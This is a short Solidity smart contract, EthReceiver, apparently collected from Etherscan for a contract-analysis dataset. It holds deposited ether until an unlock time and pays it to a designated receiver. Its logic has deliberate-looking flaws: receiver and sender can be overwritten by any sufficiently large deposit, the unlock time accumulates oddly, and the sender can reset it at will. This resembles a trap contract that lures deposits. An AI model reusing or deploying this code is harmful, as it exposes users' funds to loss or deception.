/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.22;

contract EthReceiver
{
    bool closed = false;
    uint unlockTime = 43200;
    address sender;
    address receiver;
 
    function Put(address _receiver) public payable {
        if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }

    function() public payable { }
}